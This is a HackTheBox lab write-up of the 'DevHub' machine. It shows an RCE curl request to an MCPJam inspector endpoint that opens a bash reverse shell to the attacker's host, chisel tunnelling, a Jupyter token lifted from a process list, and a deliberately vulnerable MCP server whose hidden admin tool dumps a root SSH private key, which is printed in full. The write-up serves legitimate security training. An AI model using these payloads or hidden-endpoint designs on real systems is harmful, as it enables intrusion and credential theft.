+++
title = "DevHub - Privilege escalation through hidden API endpoints"
date = 2026-06-24T16:25:48Z
difficulty = "medium"
tags = ["HTB - Medium", "Linux", "Pentesting"]
description = "Pwning the DevHub machine from HTB."
+++
## **OVERVIEW**
*DevHub* is a medium-rated Linux machine on the HackTheBox platform. Hacking into the machine requires leveraging a known CVE to gain a foothold through an MCP server endpoint, token extraction through process enumeration in order to move laterally, and privilege escalation using internal services to extract a root SSH key.
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nmap -sS -oN nmap_scan.txt 10.129.37.179                   
```
The scan revealed two open TCP ports for SSH and HTTP:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-24 16:27 PDT
Nmap scan report for 10.129.37.179
Host is up (0.078s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.40 seconds
```
I added the domain revealed by **nmap** (devhub.htb) to my **/etc/hosts** file and visited the site in a web browser:  
![homepage](/images/devhub/homepage.png)
## **ENUMERATION**
While doing manual enumeration of the site, I ran **gobuster** in the background to see if there were any hidden endpoints but came up with *nothing*. With that out of the way, I could focus on what information the site was giving me in plaintext:  
&nbsp;  
**MCP Inspector**: running on **port 6274**  
&nbsp;  
**Analytics Dashboard**: running internally  
&nbsp;  
**Code Repository**: only accessed in *maintenance mode*  
&nbsp;  
With this information from the site, the best course of action would be to find a foothold on the system through the **MCPJam** endpoint, and once *in* the system, move on to accessing the other services running internally.  
&nbsp;  
So, that's exactly what I did.  
## **FOOTHOLD**
![mcpjam dashboard](/images/devhub/mcpjam.png)
The **MCP Inspector** endpoint brought me to this page, in which I immediately recognized from a *previous* HTB machine (which I've made a writeup about [**here**](https://est706.github.io/writeups/kobold/))  
&nbsp;  
This version of **MCPJam** is susceptible to *RCE* through malicious HTTP requests. All I had to do to get a foothold was run a **curl** command on my attacker machine containing **data** for the API endpoint to run.  
&nbsp;  
First, I had to set up my **listener**:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
```
And run the **curl** command I been hyping up:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# curl http://devhub.htb:6274/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.16.192/4444 0>&1"],"env":{}},"serverId":"letmein"}' -k
```
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.16.192] from (UNKNOWN) [10.129.37.179] 36154
bash: cannot set terminal process group (1082): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
whoami
mcp-dev
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```
Shell has been **caught**.  
&nbsp;  
I went ahead and cleaned up the shell to give me a proper TTY, then moved straight to enumerating. The user I was running as didn't have the ability to do pretty much *anything* that'd be helpful for me- no SUID binaries, capabilities, none of that. So, I came at it from a different angle:  
```bash
mcp-dev@devhub:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```
Other than the **mcp-dev** user I was currently running as, the machine had an **analyst** user that looked interesting. Thinking back to the main page of the site, I remembered it mentioning an **analytics dashboard** running internally within the system.  
&nbsp;  
I checked to see what TCP connections were running so I could tunnel it back to my attacker machine:
```bash
mcp-dev@devhub:~$ ss -tlnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         511                0.0.0.0:6274             0.0.0.0:*        users:(("node-MainThread",pid=1287,fd=29))                                     
LISTEN    0         511                0.0.0.0:80               0.0.0.0:*                                                                                       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                                                                                       
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                                                                                       
LISTEN    0         128              127.0.0.1:5000             0.0.0.0:*                                                                                       
LISTEN    0         128              127.0.0.1:8888             0.0.0.0:*                                                                                       
LISTEN    0         128                   [::]:22                  [::]:* 
```
The ports that I haven't yet explored were ports **5000** and **8888**. I went ahead and uploaded the **chisel** script from my attacker machine onto the target, to use as a tunneling agent:  
&nbsp;  
First, needed to setup an **http server** to serve the script from my attacker:
```bash
┌──(root㉿pangelinan)-[~/Scripts]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Then, I grabbed the **chisel** script on the target and made it executable:  
```bash
mcp-dev@devhub:~$ wget http://10.10.16.192:8000/chisel && chmod +x chisel
```
Once that was complete, I ran the **chisel server** from my attacker: 
```bash
┌──(root㉿pangelinan)-[~/Scripts]
└─# chisel server -p 8000 --reverse
2026/06/24 16:57:47 server: Reverse tunnelling enabled
2026/06/24 16:57:47 server: Fingerprint Ob1WDAOoieLOxWIAWPVfhwTFKyIr9S/0zaZ2W8mDHxw=
2026/06/24 16:57:47 server: Listening on http://0.0.0.0:8000
```
And tunneled port **8888** from the target to my attacker, to make it accessible in a web browser:
```bash
mcp-dev@devhub:~$ ./chisel client 10.10.16.192:8000 R:8888:localhost:8888
2026/06/24 23:59:30 client: Connecting to ws://10.10.16.192:8000
2026/06/24 23:59:31 client: Connected (Latency 81.178806ms)
```
Visiting the **http://localhost:8888** URL brought me to this page:
![jupyter](/images/devhub/jupyter.png)
It was a **jupyter** login page, with **token authentication** enabled. I tried using a couple of different default password to sign-in to the dashboard but had no success. So, I shifted my focus and searched for tokens on the target machine instead.  
&nbsp;  
My user wasn't able to access anything **jupyter** related, and running **find / -name jupyter 2>/dev/null** came up empty. I had a feeling that the service was running as the **analyst** user, so I checked what processes were running as them:  
```bash
mcp-dev@devhub:~$ ps aux | grep analyst
analyst     1081  0.2  2.5 335860 103916 ?       Ssl  Jun24   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1089  0.0  0.7  37376 28904 ?        Ss   Jun24   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     1633  0.0  0.0   6828  2064 pts/1    S+   00:05   0:00 grep --color=auto analyst
```
Sure enough, I struck gold! (scroll right to see the full output of the command- which revealed an *exposed token*)  
&nbsp;  
Checking the services revealed the token I needed to sign into the dashboard, and after using successfully logging in, I was met with this page:
![analyst dashboard](/images/devhub/analyst.png)
I wasted no time and immediately clicked on the **Terminal** icon:
![analyst shell](/images/devhub/shell.png)
Boom! We've got a shell as the **analyst** user!  
&nbsp;  
The home directory of this user also had the **user.txt** flag:  
```bash
analyst@devhub:~$ ls
jupyter-env  notebooks  user.txt
analyst@devhub:~$ cat user.txt
a0800a178755abfdbec155e3a58ef044
```
With that out the way, it was time to get **root**. I started off doing my manual enumeration process, and when running the **find / -name jupyter 2>/dev/null** command again, this time I got shown a few directories worth checking:  
```bash
analyst@devhub:~$ find / -name jupyter 2>/dev/null
/home/analyst/jupyter-env/bin/jupyter
/home/analyst/jupyter-env/etc/jupyter
/home/analyst/jupyter-env/share/jupyter
/home/analyst/.local/share/jupyter
```
I wondered if the service was running as **root**, so I did a quick check of running processes: 
```bash
analyst@devhub:~$ ps aux | grep jupyter
analyst     1081  0.1  2.6 410908 105404 ?       Ssl  Jun24   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebo
root        1089  0.0  0.7  37376 28904 ?        Ss   Jun24   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
analyst     1769  0.0  0.0   6480  2304 pts/2    S+   00:13   0:00 grep --color=auto jupyter
```
**There it is**. The **/opt/opsmcp/server.py** script runs as **root**! I went ahead and changed directories to **/opt/opsmcp/** to see what I was dealing with:  
```bash
analyst@devhub:~$ cd /opt/opsmcp/
analyst@devhub:/opt/opsmcp$ cat server.py
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```
As you can see, the **server.py** script is pretty lengthy. However, it's also **super revealing**. The script is configured for an **opsmcp** service and runs on port **5000**, it also shows **hidden endpoints** that can be accessed: **ops._debug_mode** and **ops._admin_dump**. To be honest, the **debug mode** just got skipped over because the **admin dump** tool revealed what I really wanted- an **SSH key**.  
&nbsp;  
Running a curl request to the address returns this output:
```bash
analyst@devhub:/opt/opsmcp$ curl -cv http://localhost:5000
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
```
Since we have the **X-API-Key** *and* **admin dump endpoint** revealed in the script, privilege escalation to **root** would be a breeze:  
```bash
analyst@devhub:/opt/opsmcp$ curl -X POST http://localhost:5000/tools/call -H "Content-Type: application/json" -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_
keys", "confirm": true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```
A **root SSH key** right here in plaintext! There were some real bad formatting issues with the **\n** characters inserted there for newlines, so I just reran the **curl** command and piped in a **python** command to add the newlines correctly:  
```bash
analyst@devhub:/opt/opsmcp$ curl -X POST http://localhost:5000/tools/call -H "Content-Type: application/json" -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' | python3 -c "import sys,json; print(json.load(sys.stdin)['root_private_key'])"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2000  100  1919  100    81   521k  22543 --:--:-- --:--:-- --:--:--  976k
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```
Now that I got that, all I needed to do was copy the contents of the **private key**, throw it on my attacker, and **SSH** into the target as root!  
## **PRIVESC**
```bash
# In nano, I pasted the contents of the key
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nano root_key  
# Then, I set its permissions                                                
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# chmod 600 root_key             
# Finally, I got connected                     
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# ssh -i root_key root@10.129.37.179
The authenticity of host '10.129.37.179 (10.129.37.179)' can't be established.
ED25519 key fingerprint is SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.37.179' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jun 25 12:28:21 AM UTC 2026

  System load:           0.16
  Usage of /:            76.6% of 9.50GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.129.37.179
  IPv6 address for eth0: dead:beef::a0de:adff:fe6b:71fd

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jun 25 00:28:22 2026 from 10.10.16.192
root@devhub:~# 
```
I grabbed the **root.txt** flag in the **/root** directory and wrapped it up:
```bash
root@devhub:~# ls
root.txt  snap
root@devhub:~# cat root.txt
7403c20012cf2f83869a4fcfd7ac0325
```
## **TAKEAWAYS**
This machine served as a nice refresher on leveraging vulnerable MCP servers, and it was also great practice for internal process enumeration. The initial point of entry came from the **MCPJam** endpoint, just like in the *Kobold* HTB machine I wrote about on this site last month. Enumerating the machine internally for running processes revealed a token, which I used to move laterally, and hidden endpoints for SSH key extraction. Overall, a real fun experience and a nice form of strengthening my enumeration and privilege escalation skills. 